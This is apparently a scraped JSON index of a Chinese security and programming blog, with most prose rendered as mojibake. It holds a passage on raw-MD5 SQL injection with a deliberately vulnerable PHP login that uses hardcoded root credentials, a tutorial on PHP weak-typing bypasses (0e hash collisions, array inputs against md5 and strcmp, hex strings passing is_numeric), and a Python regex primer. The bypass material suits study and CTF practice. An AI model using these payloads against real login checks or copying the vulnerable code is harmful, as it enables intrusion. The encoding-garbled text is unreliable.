5f4dcc3b5aa765d61d8327deb882cf99æ”¾åˆ°MD5è§£å¯†ç½‘ç«™è§£å¯†ä¸ºpasswordï¼Œè¿™æˆ‘å°±ä¸è¯¦ç»†è¯´äº† å®éªŒè¿‡ç¨‹å…³äºè¿™é‡Œsqlæ³¨å…¥ï¼Œå¤§ä½¬æ˜¯è¿™æ ·è¯´çš„ äºæ˜¯æˆ‘ä¹‹å‰æ­å»ºç¯å¢ƒï¼Œè¿›è¡Œäº†æµ‹è¯•.(ä»¥ä¸‹æ˜¯æˆ‘è‡ªå·±ä¸ºäº†æµ‹è¯•ï¼Œå†™çš„ä»£ç ) 123456789101112131415161718192021222324252627282930313233&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;Login&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;form action=&quot;&quot; method=&quot;GET&quot;&gt; USERNAME:&lt;input type=&quot;text&quot; name=&quot;username&quot;&gt;&lt;br /&gt; PASSWORD:&lt;input type=&quot;text&quot; name=&quot;password&quot;&gt;&lt;br /&gt; &lt;input type=&quot;submit&quot; name=&quot;sub&quot;&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;&lt;?php$host = &#x27;localhost&#x27;;$user = &#x27;root&#x27;;$passwd = &#x27;root&#x27;;if (isset($_GET[&#x27;sub&#x27;]))&#123; $username = $_GET[&#x27;username&#x27;]; $password = $_GET[&#x27;password&#x27;]; $conn = new PDO(&quot;mysql:host=$host;dbname=dvwa&quot;, $user, $passwd); $sql = &quot;SELECT * FROM users WHERE password = &#x27;&quot;.md5($password,true).&quot;&#x27;&quot;; // é‡ç‚¹åœ¨è¿™é‡Œ $q = $conn-&gt;query($sql); $res = $q-&gt;fetch(); if ($username == &#x27;admin&#x27; and $res[&#x27;password&#x27;] == md5(&#x27;password&#x27;))&#123; echo $username.&#x27;ç™»å½•æˆåŠŸï¼&#x27;; &#125;&#125;else&#123; echo &quot;è¯·ç™»å…¥ï¼&quot;;&#125;?&gt; å¤§æ¦‚çš„åŸç†å°±æ˜¯$sql = &quot;SELECT * FROM users WHERE password = &#39;&quot;.md5($password,true).&quot;&#39;&quot;; ä¸Šè¿°çš„æŸ¥è¯¢è¯­å¥ï¼Œå¦‚æœ$password= ffifdyop , md5åï¼Œ276f722736c95d99e921722cf9ed621c ï¼Œ å†è½¬æˆå­—ç¬¦ä¸²ï¼š â€˜orâ€™6 é‚£ä¹ˆsqlè¯­å¥å°±æˆäº†SELECT * FROM users WHERE password = &#39;&#39;or&#39;6&lt;trash&gt;&#39; ,ä»è€Œç»•è¿‡ æˆ‘ä»¬è¿›è¡Œæµ‹è¯•ï¼š å‚è€ƒæ–‡ç«  https://joychou.org/web/SQL-injection-with-raw-MD5-hashes.html","categories":[{"name":"PHP","slug":"PHP","permalink":"https://bobtaoy.github.io/categories/PHP/"},{"name":"webå®‰å…¨","slug":"PHP/webå®‰å…¨","permalink":"https://bobtaoy.github.io/categories/PHP/web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"phpå®‰å…¨","slug":"phpå®‰å…¨","permalink":"https://bobtaoy.github.io/tags/php%E5%AE%89%E5%85%A8/"}]},{"title":"PHPé»‘é­”æ³•å­¦ä¹ æ€»ç»“","slug":"PHPé»‘é­”æ³•å­¦ä¹ æ€»ç»“","date":"2020-10-04T01:17:05.000Z","updated":"2020-10-04T01:30:43.952Z","comments":true,"path":"2020/10/04/PHPé»‘é­”æ³•å­¦ä¹ æ€»ç»“/","link":"","permalink":"https://bobtaoy.github.io/2020/10/04/PHP%E9%BB%91%E9%AD%94%E6%B3%95%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/","excerpt":"","text":"phpé»‘é­”æ³• phpé»‘é­”æ³•å°±æ˜¯æ‰€è°“çš„å¼±ç±»å‹æ¯”è¾ƒï¼Œä¸€äº›å‡½æ•°è¿”å›null,åˆ©ç”¨æ•°ç»„è¿”å›Trueçš„ä¸€äº›é—®é¢˜ å¼±ç±»å‹æ¯”è¾ƒ123456789101112131415161718&lt;?php$a = &#x27;betao.cn&#x27;;if ($a == 0)&#123; echo &#x27;Ture&#x27;;&#125;else&#123; echo &#x27;False&#x27;;&#125; // ä»¥ä¸Šä»£ç è¾“å‡º Tureecho &#x27;&lt;hr&gt;&#x27;;$b = &#x27;3betao.cn&#x27;; if ($b &gt; 2)&#123; echo &quot;True&quot;; &#125;else&#123; echo &#x27;False&#x27;;&#125;// è¾“å‡ºTrue// ä»¥ä¸Šä»£ç è¯´æ˜äº†ï¼šè‹¥å­—ç¬¦ä¸²ä»¥æ•°å­—å¼€å¤´ï¼Œåˆ™å–å¼€å¤´æ•°å­—ä½œä¸ºè½¬æ¢ç»“æœï¼Œè‹¥æ— åˆ™è¾“å‡º0 æ€»ç»“ï¼š ä»¥ä¸Šä»£ç è¯´æ˜äº†ï¼Œè‹¥å­—ç¬¦ä¸²ä»¥æ•°å­—å¼€å¤´ï¼Œåˆ™å–å¼€å¤´æ•°å­—ä½œä¸ºè½¬æ¢ç»“æœï¼Œè‹¥æ— åˆ™è¾“å‡º0 md5(),sha1() PHPåœ¨å¤„ç†å“ˆå¸Œå­—ç¬¦ä¸²æ—¶ï¼Œä¼šåˆ©ç”¨â€!=â€æˆ–â€==â€æ¥å¯¹å“ˆå¸Œå€¼è¿›è¡Œæ¯”è¾ƒï¼Œå®ƒæŠŠæ¯ä¸€ä¸ªä»¥â€0Eâ€å¼€å¤´çš„å“ˆå¸Œå€¼éƒ½è§£é‡Šä¸º0ï¼Œæ‰€ä»¥å¦‚æœä¸¤ä¸ªä¸åŒçš„å¯†ç ç»è¿‡å“ˆå¸Œä»¥åï¼Œå…¶å“ˆå¸Œå€¼éƒ½æ˜¯ä»¥â€0Eâ€å¼€å¤´çš„ï¼Œé‚£ä¹ˆPHPå°†ä¼šè®¤ä¸ºä»–ä»¬ç›¸åŒï¼Œéƒ½æ˜¯0 md5()æ˜¯ä¸èƒ½å¤„ç†æ•°ç»„çš„ï¼Œmd5(æ•°ç»„)ä¼šè¿”å›nullï¼Œä¸¤ä¸ªnullç›¸ç­‰ç»•è¿‡,sha1()ä¹Ÿæ˜¯åŒç† 1234567891011&lt;?php$a = &#x27;QNKCDZO&#x27;;$b = &#x27;s878926199a&#x27;;$md5_a = md5($a); echo $md5_a.&#x27;&lt;br&gt;&#x27;;$md5_b = md5($b); echo $md5_b.&#x27;&lt;br&gt;&#x27;;if ($md5_a == $md5_b)&#123; echo &#x27;True&#x27;;&#125;else&#123; echo &#x27;False&#x27;;&#125;?&gt; è¿™ç§é—®é¢˜ä¹Ÿå«MD5ç¢°æ’ï¼Œæ›´è¯¦ç»†æ›´å¤šçš„å¯ä»¥å‚è€ƒæˆ‘ä¹‹å‰çš„æ–‡ç« ï¼šhttps://www.betao.cn/archives/md5same.html 123456789101112&lt;?php$a = $_GET[&#x27;a&#x27;];$b = $_GET[&#x27;b&#x27;];echo md5($a).&#x27;&lt;br&gt;&#x27;;echo md5($b).&#x27;&lt;br&gt;&#x27;;if (md5($a) === md5($b))&#123; echo &#x27;True&#x27;; // è¾“å‡ºTrue&#125;else&#123; echo &#x27;Flase&#x27;;&#125;// betao.cn?&gt; ä¸Šé¢ä»£ç äº§ç”Ÿçš„åŸå› ä¸ºï¼Œmd5ä¸èƒ½å¤„ç†æ•°ç»„ï¼Œè¿”å›null è½¬æ¢ phpä¼šè‡ªåŠ¨è¿›è¡Œè½¬æ¢ï¼Œæ¯”å¦‚16è¿›åˆ¶ï¼Œç§‘å­¦è®¡æ•°æ³•ç­‰ï¼Œæœ‰æ—¶ä¹Ÿç”¨è¿™ç‚¹ç»•è¿‡ strcmpå‡½æ•°æ•°ç»„ç»•è¿‡ 12345678&lt;?php$a = $_GET[&#x27;a&#x27;];if (strcmp(&#x27;betao.cn&#x27;, $a))&#123; echo &#x27;Flase&#x27;; &#125;else&#123; echo &#x27;True&#x27;;&#125;?&gt; åˆ©ç”¨æ•°ç»„a[]=1, è¿”å›Trueï¼ŒæˆåŠŸç»•è¿‡éªŒè¯ strcmp()å‡½æ•°åªæœ‰åœ¨ç›¸ç­‰çš„æƒ…å†µä¸‹è¿”å›0ã€‚é‚£ä¹ˆæˆ‘ä»¬ä¼ å…¥ä¸€ä¸ªæ•°ç»„ï¼Œå®ƒä¼šè¿”å›NULLï¼Œè€Œåˆ¤æ–­ä½¿ç”¨äº†ï¼Œè€ŒNULL=0æ˜¯bool(true)ï¼Œè¿™æ ·å°±æˆåŠŸç»•è¿‡ã€‚ ereg() æˆ–è€… eregi() ereg() å‡½æ•°æˆ– eregi() å‡½æ•°å­˜åœ¨ç©ºå­—ç¬¦æˆªæ–­æ¼æ´ï¼Œå³å‚æ•°ä¸­çš„æ­£åˆ™è¡¨è¾¾å¼æˆ–å¾…åŒ¹é…å­—ç¬¦ä¸²é‡åˆ°ç©ºå­—ç¬¦åˆ™æˆªæ–­ä¸¢å¼ƒåé¢çš„æ•°æ® è¯¦ç»†çš„è¯´æ˜ï¼Œå‚è€ƒï¼š https://www.betao.cn/archives/giveup.html is_numeric() is_numeric()**ä½œç”¨ï¼š åˆ¤æ–­å˜é‡æ˜¯å¦ä¸ºæ•°å­—æˆ–æ•°å­—å­—ç¬¦ä¸²ï¼Œä¸ä»…æ£€æŸ¥10è¿›åˆ¶ï¼Œ16è¿›åˆ¶**æ˜¯å¯ä»¥ å½“æœ‰ä¸¤ä¸ªis_numericåˆ¤æ–­å¹¶ç”¨andè¿æ¥æ—¶ï¼Œandåé¢çš„is_numericå¯ä»¥ç»•è¿‡ 16è¿›åˆ¶ä¹Ÿå¯ä»¥ç»•è¿‡is_numeric()æ£€éªŒï¼Œå¯ä»¥ç”¨æ¥ç»•è¿‡sqlæ³¨å…¥é‡Œçš„è¿‡æ»¤ 12345678910111213&lt;?php$a = $_GET[&#x27;a&#x27;];$b = $_GET[&#x27;b&#x27;];$c = is_numeric($a) and is_numeric($b);var_dump(is_numeric($a));echo &#x27;&lt;br&gt;&#x27;;var_dump(is_numeric($b));echo &#x27;&lt;br&gt;&#x27;;var_dump($c); // è¿”å›Trueecho &#x27;&lt;br&gt;&#x27;;$test = false and true; // è¿”å›Falsevar_dump($test);?&gt; is_numericå‡½æ•°å¯¹äºç©ºå­—ç¬¦%00ï¼Œæ— è®ºæ˜¯%00æ”¾åœ¨å‰åéƒ½å¯ä»¥åˆ¤æ–­ä¸ºéæ•°å€¼ï¼Œè€Œ%20ç©ºæ ¼å­—ç¬¦åªèƒ½æ”¾åœ¨æ•°å€¼åã€‚æ‰€ä»¥ï¼ŒæŸ¥çœ‹å‡½æ•°å‘ç°è¯¥å‡½æ•°å¯¹å¯¹äºç¬¬ä¸€ä¸ªç©ºæ ¼å­—ç¬¦ä¼šè·³è¿‡ç©ºæ ¼å­—ç¬¦åˆ¤æ–­ï¼Œæ¥ç€åé¢çš„åˆ¤æ–­ï¼ è¯¥å‡½æ•°è¿˜å¯èƒ½é€ æˆsqlæ³¨å…¥ï¼Œä¾‹å¦‚å°†â€˜1 or 1&#39;è½¬æ¢ä¸º16è¿›åˆ¶å½¢å¼ï¼Œå†ä¼ å‚ï¼Œå°±å¯ä»¥é€ æˆsqlæ³¨å…¥ switch()å½“switch()æ²¡æœ‰breakæ—¶å¯ä»¥ç»§ç»­å¾€ä¸‹æ‰§è¡Œè¿™é‡Œä¹Ÿæœ‰è‡ªåŠ¨è½¬æ¢ï¼Œæ¯”å¦‚$a = a,ä¼šå½“0æ‰§è¡Œï¼Œ$a=1aï¼Œä¼šå½“1æ‰§è¡Œâ€¦â€¦ NULL,0,â€0â€³,array()ä½¿ç”¨==å’Œfalseæ¯”è¾ƒæ—¶ï¼Œéƒ½ä¼šè¿”å›true123456789101112131415&lt;?php$a = NULL;$b = 0;$c = &quot;0&quot;;$d = array();// ä»¥ä¸‹æ˜¯ä¸‰å…ƒè¿ç®—ç¬¦echo $a == false ? &#x27;True&#x27;: &#x27;False&#x27;;echo &#x27;&lt;hr&gt;&#x27;;echo $b == false ? &#x27;True&#x27;: &#x27;False&#x27;;echo &#x27;&lt;hr&gt;&#x27;;echo $b == false ? &#x27;True&#x27;: &#x27;False&#x27;;echo &#x27;&lt;hr&gt;&#x27;;echo $b == false ? &#x27;True&#x27;: &#x27;False&#x27;;?&gt; php://ä¼ªåè®®ç»•è¿‡æ¥æ”¶å‚æ•°ä¸­ä¸èƒ½å‡ºç°æŸä¸€å­—ç¬¦ï¼Œä½†ä¸‹é¢åˆå¿…é¡»ä½¿ç”¨å¯ä»¥php://ä¼ªåè®®ç»•è¿‡ ç›®å‰é‡åˆ°çš„æ˜¯file_get_contents(),å…¶ä»–æƒ…å†µå…·ä½“è€Œå®š array_search() ç”¨åˆ°äº†PHPå¼±ç±»å‹çš„ä¸€ä¸ªç‰¹æ€§ï¼Œå½“ä¸€ä¸ªæ•´å½¢å’Œä¸€ä¸ªå…¶ä»–ç±»å‹è¡Œæ¯”è¾ƒçš„æ—¶å€™ï¼Œä¼šå…ˆæŠŠå…¶ä»–ç±»å‹intvalå†æ¯”","categories":[{"name":"PHP","slug":"PHP","permalink":"https://bobtaoy.github.io/categories/PHP/"},{"name":"webå®‰å…¨","slug":"PHP/webå®‰å…¨","permalink":"https://bobtaoy.github.io/categories/PHP/web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"phpå®‰å…¨","slug":"phpå®‰å…¨","permalink":"https://bobtaoy.github.io/tags/php%E5%AE%89%E5%85%A8/"}]},{"title":"Pythonæ­£åˆ™è¡¨è¾¾å¼(å…¥é—¨åˆ°è¿›é˜¶)","slug":"Pythonæ­£åˆ™è¡¨è¾¾å¼-å…¥é—¨åˆ°è¿›é˜¶","date":"2020-10-04T01:13:16.000Z","updated":"2020-10-04T01:14:37.787Z","comments":true,"path":"2020/10/04/Pythonæ­£åˆ™è¡¨è¾¾å¼-å…¥é—¨åˆ°è¿›é˜¶/","link":"","permalink":"https://bobtaoy.github.io/2020/10/04/Python%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F-%E5%85%A5%E9%97%A8%E5%88%B0%E8%BF%9B%E9%98%B6/","excerpt":"","text":"Python-&gt;re ä¹‹å‰æƒ³ç€ç©çˆ¬è™«ï¼Œç‰¹æ„æ‰¾ä¸€äº›å¤§ä½¬çš„æ–‡ç« å­¦çš„ï¼Œä½¿ç”¨jupyter notebookå†™çš„,ä»¥ä¸‹æ˜¯å¯¼å‡ºæˆmarkdownè¯­æ³•å½¢æˆçš„æ ·å­ï¼Œä¸€äº›æ›´ç»†èŠ‚çš„è§£é‡Šï¼Œå¯ä»¥å‚çœ‹æ–‡æœ«å¤§ä½¬æ€»ç»“çš„æ–‡ç« ã€‚ 12345678910111213141516171819202122232425262728293031323334import restr1 = &quot;&lt;table&gt;&lt;tr&gt;hello world 18111234589&lt;tr&gt;&lt;tr&gt;&lt;span&gt;name:å¼ ä¸‰,tel:18711001111&lt;/span&gt;&lt;/tr&gt;&lt;/table&gt;&quot;&#x27;&#x27;&#x27;éœ€æ±‚ï¼š1.æå–å­—ç¬¦ä¸²ä¸­&lt;span&gt;æ ‡ç­¾é‡Œçš„å†…å®¹ï¼›2.æå–å…¶ä¸­æ‰€æœ‰çš„æ‰‹æœºå·ï¼›&#x27;&#x27;&#x27;#ç¬¬ä¸€é¢˜:start = str1.find(&#x27;&lt;span&gt;&#x27;)end = str1.rfind(&#x27;&lt;/span&gt;&#x27;)if start != -1: print(str1[start+len(&#x27;&lt;span&gt;&#x27;):end])#ç¬¬ä¸€é¢˜ è·å–&lt;span&gt;æ ‡ç­¾å†…çš„æ‰€æœ‰æ•°æ®info = re.search(r&#x27;(?&lt;=&lt;span&gt;).*(?=&lt;/span&gt;)&#x27;,str1)print(info.group(0))#è¾“å‡ºï¼šname:å¼ ä¸‰,tel:18711001111#ç¬¬äºŒé¢˜:&#x27;&#x27;&#x27;æå–æ‰‹æœºå·ï¼šï¼ˆå¿…é¡»å…ˆæ¸…æ¥šæ‰‹æœºå·çš„è§„åˆ™ï¼‰ 1.å¿…é¡»æ˜¯11ä½çš„æ•°å­— 2.ç¬¬ä¸€ä½æ•°å­—ä»¥1å¼€å¤´ï¼Œç¬¬äºŒä½æ•°å­—å¯ä»¥æ˜¯[3,4,5,7,8]ä¸­çš„ä»»æ„ä¸€ä¸ªåé¢9ä¸ªæ˜¯[0-9]ä¸­çš„ä»»æ„ä¸€ä¸ªæ•°å­— ï¼ˆç°åœ¨è§„åˆ™æ›´å¤šäº†ï¼Œå‡ºç°äº†19**çš„å·ç ï¼Œè¿™é‡Œä½œä¸ºä¾‹å­å°±ç®€å•ä¸€ç‚¹ï¼‰ï¼›&#x27;&#x27;&#x27;#ç¬¬äºŒé¢˜ æå–æ‰€æœ‰æ‰‹æœºå·ï¼šphone = re.findall(r&#x27;1[345678]\\d&#123;9&#125;&#x27;,str1)print(phone)#è¾“å‡ºï¼š[&#x27;18111234589&#x27;, &#x27;18711001111&#x27;] name:å¼ ä¸‰,tel:18711001111 name:å¼ ä¸‰,tel:18711001111 [&#39;18111234589&#39;, &#39;18711001111&#39;] 1234567891011121314151617&#x27;&#x27;&#x27;ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼æœ‰ä¸¤ä¸ªå¸¸è§çš„åŸå› : ç¬¬ä¸€ä¸ªåŸå› æ˜¯æ•°æ®æŒ–æ˜â€”â€”ä¹Ÿå°±æ˜¯è¯´ï¼Œå½“æˆ‘ä»¬å¸Œæœ›åœ¨ä¸€å¤§å †æ–‡æœ¬ä¸­æ‰¾åˆ°ä¸€å°å †æ–‡æœ¬ï¼Œä¾‹å¦‚ï¼šèº«ä»½è¯ï¼Œæ‰‹æœºå·ï¼Œe-mailç­‰ï¼› ç¬¬äºŒä¸ªåŸå› æ˜¯éªŒè¯ï¼Œå¯ä»¥ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼ç¡®è®¤è·å¾—çš„æ•°æ®æ˜¯ä½ æ‰€æœŸæœ›çš„ï¼Œå¦‚ç”¨æˆ·éªŒè¯ï¼Œå¯†ç é•¿åº¦å’Œæ ¼å¼çš„éªŒè¯ï¼›re æ¨¡å—&#x27;&#x27;&#x27;#é¦–å…ˆæˆ‘ä»¬å­¦ä¹ ç¬¬ä¸€ä¸ªå‡½æ•°ï¼Œsearch()å‡½æ•°ï¼Œå®ƒçš„ç›®çš„æ˜¯æ¥æ”¶ä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼å’Œä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œå¹¶è¿”å›å‘ç°çš„ç¬¬ä¸€ä¸ªåŒ¹é…çš„å­—ç¬¦ä¸²a = re.search(r&#x27;fox&#x27;,&#x27;the quick brown fox jumpred&#x27;)#ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºæ­£åˆ™è¡¨è¾¾å¼ï¼Œç¬¬äºŒä¸ªå‚æ•°ä¸ºè¦å¤„ç†çš„å­—ç¬¦ä¸²print(a.span()) #spanæ–¹æ³•è·å–çš„æ˜¯æ­£åˆ™è¡¨è¾¾å¼åŒ¹é…åˆ°çš„ä½ç½®,è¾“å‡º&#x27;(16,19)&#x27;b = re.search(r&#x27;www&#x27;,&#x27;the quick brown fox jumpred&#x27;)print(b) #è¾“å‡ºNone (16, 19) None 1234567891011121314#æ‰¾åˆ°å¤šä¸ªåŒ¹é…&#x27;&#x27;&#x27;re.search çš„ä¸€ä¸ªé™åˆ¶æ˜¯å®ƒä»…ä»…è¿”å›æœ€è¿‘ä¸€ä¸ªä»¥ match å¯¹è±¡å½¢å¼çš„åŒ¹é…ï¼Œå¦‚æœåœ¨ä¸€ä¸ªå­—ç¬¦ä¸²å†…å­˜åœ¨å¤šä¸ªåŒ¹é…ï¼Œre.search()åªä¼šè¿”å›ç¬¬ä¸€ä¸ªåŒ¹é…ï¼Œä¸€èˆ¬æƒ…å†µä¸‹è¿™ä¹Ÿæ˜¯æˆ‘ä»¬æœŸæœ›çš„ç»“æœï¼Œä½†æ˜¯ï¼Œæœ‰æ—¶å€™éœ€è¦å½“å¤šä¸ªåŒ¹é…å­˜åœ¨æ—¶è¿›è¡Œå¤šä¸ªåŒ¹é…ã€‚å¦‚æœæœ‰è¿™ç§éœ€æ±‚å’±ä»¬å¯ä»¥ä½¿ç”¨ findall æˆ–è€… finditerã€‚ä¸¤ä¸ªæ–¹æ³•çš„åŒºåˆ«åœ¨äº findall è¿”å›çš„æ˜¯ä¸€ä¸ªåˆ—è¡¨ï¼Œfinditerè¿”å›çš„æ˜¯ä¸€ä¸ªç”Ÿæˆå™¨&#x27;&#x27;&#x27;l = re.findall(r&#x27;å¼ &#x27;,&#x27;å¼ ä¸‰ å¼ ä¸‰ä¸° å¼ æ— å¿Œ å¼ å°å‡¡&#x27;)print(l)#åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œæˆ‘ä»¬ä¼šå‘ç°findallè¿”å›äº†æ‰€æœ‰åŒ¹é…çš„å€¼ï¼Œè¿™æ˜¯å› ä¸ºâ€œå¼ â€å­—åœ¨åé¢çš„å­—ç¬¦ä¸²ä¸­å‡ºç°äº†4æ¬¡ [&#39;å¼ &#39;, &#39;å¼ &#39;, &#39;å¼ &#39;, &#39;å¼ &#39;] 123456789101112131415#åŸºç¡€æ­£åˆ™è¡¨è¾¾å¼&#x27;&#x27;&#x27;æœ€ç®€å•çš„æ­£åˆ™è¡¨è¾¾å¼æ˜¯å“ªäº›ä»…åŒ…å«ç®€å•å­—æ¯æ•°å­—å­—ç¬¦çš„è¡¨è¾¾å¼â€”â€”ä¸åŒ…å«ä»»ä½•å…¶ä»–å­—ç¬¦ã€‚å­—ç¬¦ä¸²Pythonæ˜¯ä¸€ä¸ªæœ‰æ•ˆçš„æ­£åˆ™è¡¨è¾¾å¼ï¼Œå®ƒä»…åŒ¹é…å•è¯ï¼Œé»˜è®¤æ­£åˆ™è¡¨è¾¾å¼åŒºåˆ†å¤§å°å†™ï¼Œä¾‹å¦‚ï¼š&#x27;&#x27;&#x27;a = re.search(r&#x27;Python&#x27;,&#x27;I Like python&#x27;)print(a)b = re.search(r&#x27;Python&#x27;,&#x27;I LIKE PYTHON&#x27;)print(b)&#x27;&#x27;&#x27;ä¸è¿‡å¦‚æœåªæ˜¯ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼æ¥åŒ¹é…æ–‡æœ¬ï¼Œæ²¡æœ‰ä»€ä¹ˆå®é™…çš„æ„ä¹‰ï¼Œæ¯•ç«Ÿæ£€æµ‹ä¸€ä¸ªæ–‡æœ¬ä¸­æ˜¯å¦æœ‰å¦ä¸€ä¸ªå­—ç¬¦ä¸²æœ¬æ¥å°±éå¸¸ç®€å•ã€‚æ­£åˆ™è¡¨è¾¾å¼å¼ºå¤§çš„åœ°æ–¹åœ¨äºèƒ½å¤ŸæŒ‡å®šç”¨äºåŒ¹é…çš„æ–‡æœ¬æ¨¡å¼ã€‚&#x27;&#x27;&#x27; None None 12345a = re.findall(r&#x27;[Pp]ython&#x27;,&#x27;I Like Python3 and I like python2.7&#x27;)print(a)#å¯ä»¥å‘ç°[Pp]æ—¢å¯ä»¥åŒ¹é…å¤§å†™çš„Pä¹Ÿå¯ä»¥åŒ¹é…å°å†™çš„p#æ‰§è¡Œä¼šå‘ç°è¾“å‡ºä¸ºç©ºæ•°ç»„ï¼Œè¿™é‡Œå€¼çš„æˆ‘ä»¬æ³¨æ„çš„æ˜¯[Pp]ä»…åŒ¹é…ä¸€ä¸ªå­—ç¬¦ [&#39;Python&#39;, &#39;python&#39;] 123456789101112131415161718192021#åŒºé—´&#x27;&#x27;&#x27;æœ‰ä¸€äº›å¸¸è§çš„å­—ç¬¦ç»„éå¸¸å¤§ï¼Œæ¯”å¦‚ï¼Œæˆ‘ä»¬è¦åŒ¹é…çš„æ˜¯ä»»æ„æ•°å­—ï¼Œå¦‚æœä¾ç…§ä¸Šè¿°ä»£ç ï¼Œæ¯æ¬¡æˆ‘ä»¬éƒ½éœ€è¦ä½¿ç”¨[0123456789] è¿™ç§æ–¹å¼æ˜æ˜¾å¾ˆä¸æ˜æ™ºï¼Œè€Œå¦‚æœè¦åŒ¹é…ä»a-zçš„å­—æ¯ï¼Œæˆ‘ä»¬ä¹Ÿè¿™æ ·ç¼–å†™ä»£ç çš„è¯ï¼Œè‚¯å®šä¼šè®©æˆ‘ä»¬å´©æºƒä¸ºäº†é€‚åº”è¿™ä¸€ç‚¹ï¼Œæ­£åˆ™è¡¨è¾¾å¼å¼•æ“åœ¨å­—ç¬¦ç»„ä¸­ä½¿ç”¨è¿å­—ç¬¦(-)ä»£è¡¨åŒºé—´ï¼Œæ‰€ä»¥æˆ‘ä»¬åŒ¹é…ä»»æ„æ•°å­—å¯ä»¥ä½¿ç”¨[0-9]ï¼Œæ‰€ä»¥å¦‚æœæˆ‘ä»¬æƒ³è¦åŒ¹é…æ‰€æœ‰å°å†™å­—æ¯ï¼Œå¯ä»¥å†™æˆ[a-z]ï¼Œæƒ³è¦åŒ¹é…æ‰€æœ‰å¤§å†™å­—æ¯å¯ä»¥å†™æˆ[A-Z]å¯èƒ½æˆ‘ä»¬è¿˜æœ‰ä¸ªéœ€æ±‚ï¼šåŒ¹é…è¿å­—ç¬¦ã€‚å› ä¸º-åœ¨ä¼šè¢«æ­£åˆ™è¡¨è¾¾å¼å¼•æ“ç†è§£ä¸ºä»£è¡¨è¿æ¥åŒºé—´ï¼Œæ‰€ä»¥è¿™ä¸ªæ—¶å€™æˆ‘ä»¬éœ€è¦å¯¹-è¿›è¡Œè½¬ä¹‰&#x27;&#x27;&#x27;a = re.findall(r&#x27;[0-9]&#x27;,&#x27;xxx007abc&#x27;)b = re.findall(r&#x27;[a-z]&#x27;,&#x27;abc001ABC&#x27;)c = re.findall(r&#x27;[A-Za-z0-9]&#x27;,&#x27;abc007ABC&#x27;)d = re.findall(r&#x27;[0-9\\-]&#x27;,&#x27;0edu 007-edu&#x27;)print(a)print(b)print(c)print(d) [&#39;0&#39;, &#39;0&#39;, &#39;7&#39;] [&#39;a&#39;, &#39;b&#39;, &#39;c&#39;] [&#39;a&#39;, &#39;b&#39;, &#39;c&#39;, &#39;0&#39;, &#39;0&#39;, &#39;7&#39;, &#39;A&#39;, &#39;B&#39;, &#39;C&#39;] [&#39;0&#39;, &#39;0&#39;, &#39;0&#39;, &#39;7&#39;, &#39;-&#39;] 123456789101112131415161718192021#å–åa = re.findall(r&#x27;[^0-9]&#x27;,&#x27;xxx007abc&#x27;)b = re.search(r&#x27;[^0-9]&#x27;,&#x27;xxx007abc&#x27;)print(a)print(b)#å¯ä»¥é€šè¿‡åœ¨å­—ç¬¦æ•°ç»„å¼€å¤´ä½¿ç”¨^å­—ç¬¦å®ç°å–åæ“ä½œï¼Œä»è€Œå¯ä»¥åè½¬ä¸€ä¸ªå­—ç¬¦ç»„ï¼ˆæ„å‘³ç€ä¼šåŒ¹é…ä»»ä½•æŒ‡å®šå­—ç¬¦ä¹‹å¤–çš„æ‰€æœ‰å­—ç¬¦ï¼‰&#x27;&#x27;&#x27;æ¥ä¸‹æ¥åœ¨çœ‹ä¸€ä¸ªè¡¨è¾¾å¼ï¼šn[^e] è¿™æ„å‘³ç€å­—ç¬¦næ¥ä¸‹æ¥çš„å­—ç¬¦æ˜¯é™¤äº†eä¹‹å¤–æ‰€æœ‰çš„å­—ç¬¦&#x27;&#x27;&#x27;a = re.findall(r&#x27;n[^e]&#x27;,&#x27;final&#x27;)b = re.search(r&#x27;n[^e]&#x27;,&#x27;final&#x27;)c = re.findall(r&#x27;[n[^e]]&#x27;,&#x27;Python&#x27;)print(a)print(b)print(c)&#x27;&#x27;&#x27;è¿™é‡Œæˆ‘ä»¬å¯ä»¥å‘ç°aå’ŒbåŒ¹é…çš„æ˜¯naï¼Œå­—ç¬¦aå› ä¸ºä¸æ˜¯eæ‰€ä»¥å¯ä»¥è¢«åŒ¹é…ï¼Œè€Œå˜é‡cçš„å€¼ä¸ºç©ºï¼Œåœ¨è¿™é‡Œæ­£åˆ™è¡¨è¾¾å¼å¼•æ“åªåŒ¹é…åˆ°äº†å­—ç¬¦ä¸²nçš„ä½ç½®ï¼Œè€Œnä¹‹åæ²¡æœ‰ä»»ä½•å¯ä»¥åŒ¹é…[^e]çš„å­—ç¬¦äº†ï¼Œæ‰€ä»¥è¿™é‡Œä¹ŸåŒ¹é…å¤±è´¥&#x27;&#x27;&#x27; [&#39;x&#39;, &#39;x&#39;, &#39;x&#39;, &#39;a&#39;, &#39;b&#39;, &#39;c&#39;] &lt;re.Match object; span=(0, 1), match=&#39;x&#39;&gt; [&#39;na&#39;] &lt;re.Match object; span=(2, 4), match=&#39;na&#39;&gt; [] 123456789101112131415161718192021222324252627282930313233#å¿«æ·æ–¹å¼&#x27;&#x27;&#x27;å‡ ç§æ™®é€šå­—ç¬¦ç»„è¿˜åœ¨æ­£åˆ™è¡¨è¾¾å¼å¼•æ“ä¸­æœ‰å‡ ä¸ªé¢„å®šä¹‰çš„å¿«æ·æ–¹å¼ï¼Œå¦‚æœæˆ‘ä»¬æƒ³è¦å®šä¹‰å•è¯ï¼Œä»¥ç›®å‰å­¦åˆ°çš„å¯èƒ½ä¼šä½¿ç”¨[A-Za-z]ï¼Œä½†æ˜¯ï¼Œå¾ˆå¤šå•è¯éƒ½æ˜¯ä½¿ç”¨è¯¥å·¨å‰‘ä»¥å¤–çš„å­—ç¬¦ã€‚æ¯”å¦‚ä¸­æ–‡ï¼Œä»¥åŠå…¶ä»–è¯­è¨€ï¼Œæ­£åˆ™è¡¨è¾¾å¼å¼•æ“æä¾›äº†ä¸€äº›å¿«æ·æ–¹å¼ï¼šw 